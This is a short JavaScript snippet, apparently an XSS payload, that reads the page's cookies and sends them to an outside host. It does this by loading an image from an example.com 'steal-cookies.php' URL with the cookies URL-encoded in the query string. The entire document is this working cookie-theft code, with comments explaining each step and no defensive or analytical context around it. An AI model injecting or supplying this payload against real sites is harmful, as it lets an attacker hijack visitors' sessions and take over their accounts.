// Get the cookies from the document
const cookies = document.cookie;

const img = new Image();

// Set the src attribute of the Image object to a URL that will receive the cookies
img.src = 'http://example.com/steal-cookies.php?cookies=' + encodeURIComponent(cookies);
